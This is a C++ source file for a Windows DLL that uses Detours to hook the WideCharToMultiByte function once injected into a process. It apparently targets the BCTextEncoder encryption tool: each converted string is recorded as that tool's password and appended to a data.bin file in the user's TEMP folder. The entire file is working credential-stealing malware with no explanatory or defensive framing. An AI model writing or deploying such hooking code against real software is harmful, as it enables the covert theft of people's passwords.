#include "stdafx.h"
#include <Windows.h>
#include <detours.h>
#include <dpapi.h>
#include <wincred.h>
#include <strsafe.h>
#include <subauth.h>
#define SECURITY_WIN32 
#include <sspi.h>
#include <stringapiset.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")


LPCWSTR lpBCTextEncoderPassword = NULL;


VOID WriteCredentials() {
	const DWORD cbBuffer = 1024;
	TCHAR TempFolder[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
	TCHAR Path[MAX_PATH];
	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WCHAR  DataBuffer[cbBuffer];
	memset(DataBuffer, 0x00, cbBuffer);
	DWORD dwBytesWritten = 0;
	//StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n", lpServer, lpUsername, lpTempPassword);
	StringCbPrintf(DataBuffer, cbBuffer, L"BCTextEncoderPassword: %s\n\n", lpBCTextEncoderPassword);

	WriteFile(hFile, DataBuffer, wcslen(DataBuffer) * 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

}


static int(WINAPI* TrueWideCharToMultiByte)(UINT CodePage, DWORD  dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) = WideCharToMultiByte;

int _WideCharToMultiByte(UINT CodePage, DWORD  dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	lpBCTextEncoderPassword = lpWideCharStr; 
	WriteCredentials();
	return TrueWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)TrueWideCharToMultiByte, _WideCharToMultiByte);


		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)TrueWideCharToMultiByte, _WideCharToMultiByte);
		DetourTransactionCommit();

	}
	return TRUE;
}